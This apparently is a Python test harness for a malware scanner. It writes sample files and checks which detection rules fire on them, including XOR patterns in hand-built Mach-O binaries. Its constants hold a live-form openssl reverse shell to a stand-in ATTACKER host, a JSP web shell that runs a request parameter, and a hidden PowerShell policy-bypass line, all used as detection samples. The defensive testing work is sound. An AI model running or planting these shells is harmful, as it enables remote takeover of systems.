"""Focused controls for documented payloads and native state-XOR traits."""
import json
import os
from pathlib import Path
import struct
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[2]
RULES = [
    'objectives/command-and-control/reverse-shell/stream-bridge::openssl-fifo-interactive-shell',
    'third_party/Volexity/Susp/Jsp/General/Runtime/Exec/Req',
    'micro-behaviors/process/create/hidden::powershell-bypass-file-hidden-flags',
]
XOR = 'micro-behaviors/data/encoding/xor::'
SHELL = 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:4444 > /tmp/s; rm /tmp/s\n'
JSP = '<%@ page import="java.io.*" %>\n<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>\n'
PS = 'powershell -nop -w hidden -ep bypass -c "Get-Date"\n'


def macho(code, arm=False):
    # Minimal native image with a mapped executable __text section.
    off = 32 + 72 + 80
    header = struct.pack('<IiiIIIII', 0xfeedfacf, 0x100000c if arm else 0x1000007,
                         0 if arm else 3, 2, 1, 152, 0, 0)
    segment = struct.pack('<II16sQQQQiiII', 0x19, 152, b'__TEXT',
                          0x100000000, off + len(code), 0, off + len(code), 7, 5, 1, 0)
    section = struct.pack('<16s16sQQIIIIIIII', b'__text', b'__TEXT',
                          0x100000000 + off, len(code), off, 2, 0, 0, 0x80000400, 0, 0, 0)
    return header + segment + section + code


def scan(path):
    env = dict(os.environ, CLEAVE_TRAITS_DIR=str(ROOT))
    run = subprocess.run(['cleave', '--format', 'json', str(path)], env=env,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if not run.stdout.strip():
        raise RuntimeError(run.stderr)
    report = json.loads(run.stdout)
    # Cleave CLI JSON uses a different envelope than atomscan's compact report.
    findings = set()
    def walk(value):
        if isinstance(value, dict):
            if isinstance(value.get('id'), str):
                findings.add(value['id'])
            for child in value.values():
                walk(child)
        elif isinstance(value, list):
            for child in value:
                walk(child)
    walk(report)
    return findings


def main():
    results = []
    with tempfile.TemporaryDirectory(prefix='stranded-controls-') as work:
        work = Path(work)
        doc = '---\nname: shell-testing\ndescription: Remote shell assessment reference\n---\n'
        doc += '# Assessment reference\n## Shell\n```bash\n' + SHELL + '```\n'
        doc += '## Web\n```jsp\n' + JSP + '```\n'
        doc += '## Windows\n```powershell\n' + PS + '$x = [Convert]::ToBase64String($b)\n```\n'
        doc += '## Transfer\n```bash\necho "$data" | base64 -d > file\n```\n'
        p = work / 'SKILL.md'
        p.write_text(doc)
        ids = scan(p)
        assert not set(RULES) & ids, sorted(set(RULES) & ids)
        assert 'metadata/file/profile/markup::reference-guide-code-fence' in ids
        assert 'micro-behaviors/data/decode/base64::base64-decode-command' in ids
        assert 'micro-behaviors/data/encode/base64::to-base64-string' in ids
        results.append('structured reference suppresses three attack findings')
        for filename, body, expected in [
            ('active.sh', SHELL, RULES[0]),
            ('active.jsp', JSP, RULES[1]),
            ('active.bat', PS, RULES[2]),
        ]:
            p = work / filename
            p.write_text(body)
            assert expected in scan(p), (filename, expected)
            results.append(filename + ': attack pattern retained')
        x64 = bytes.fromhex('0fbe04083385046fffff88c18b85086fffff888c05206fffff8bbd046fffffe8f00300008985046fffff')
        arm = bytes.fromhex('0869e938e91740b90801094ae9b3009129110091ea1b40b928692a38e01740b92d010094e01700b9')
        for is_arm, code, local in [(False, x64, 'x64'), (True, arm, 'arm64')]:
            p = work / (local + '.macho')
            p.write_bytes(macho(code, is_arm))
            rule = XOR + local + '-helper-updated-state-byte-xor'
            assert rule in scan(p), rule
            mutated = code.replace(bytes.fromhex('0801094a' if is_arm else '3385'),
                                   bytes.fromhex('0801090b' if is_arm else '0385'), 1)
            p.write_bytes(macho(mutated, is_arm))
            assert rule not in scan(p), rule
            results.append(local + ': XOR matches; addition near miss excluded')
    print(json.dumps({'passed': results}, indent=2))


if __name__ == '__main__':
    main()
